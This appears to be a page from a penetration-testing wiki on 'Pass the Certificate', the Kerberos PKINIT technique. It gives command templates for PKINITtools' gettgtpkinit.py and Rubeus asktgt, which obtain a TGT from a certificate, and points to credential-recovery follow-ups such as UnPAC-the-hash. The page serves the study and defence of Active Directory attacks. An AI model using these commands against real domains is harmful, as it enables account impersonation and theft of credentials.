# Pass the Certificate

## Theory

The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](asreproast.md)). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.&#x20;

Passing the Certificating the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT. This operation is often conducted along [shadow credentials](shadow-credentials.md), [AD CS escalation](../ad-cs/) and [UnPAC-the-hash attacks](unpac-the-hash.md).

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Dirk-jan](https://twitter.com/\_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.

```python
# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```

The ticket obtained can then be used to

* authenticate with [pass-the-cache](ptc.md)
* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack. This can be done with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/).
* obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools).
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to request a TGT (Ticket Granting Ticket) for the target object from a base64-encoded PFX certificate (with an optional password).

```bash
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

{% hint style="info" %}
PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.

```bash
openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"
```
{% endhint %}

The ticket obtained can then be used to

* authenticate with [pass-the-ticket](ptt.md)
* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack (add the `/getcredentials` flag to Rubeus's asktgt command)
* obtain access to the account's SPN with an S4U2Self.
{% endtab %}
{% endtabs %}
